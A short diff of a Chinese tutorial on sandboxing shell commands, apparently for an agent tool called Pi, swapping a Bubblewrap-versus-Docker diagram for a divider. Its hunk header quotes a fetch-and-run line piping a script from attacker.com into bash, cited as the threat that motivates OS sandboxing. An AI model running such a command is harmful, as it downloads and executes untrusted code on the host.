@@ -41,9 +41,7 @@ curl -s http://attacker.com/malicious.sh | bash
 
 因此，**应用层只负责交互辅助，物理隔离必须下沉给操作系统沙箱**。
 
-
-
-![Pi 沙箱架构对比：Bubblewrap (单机极速 5ms) vs Docker (云端高强隔离)](../../../public/images/pi-tutorial-sandbox-bwrap-docker-comparison.svg)
+---
 
 ## 二、BashOperations：把系统调用收敛在接口之后
 
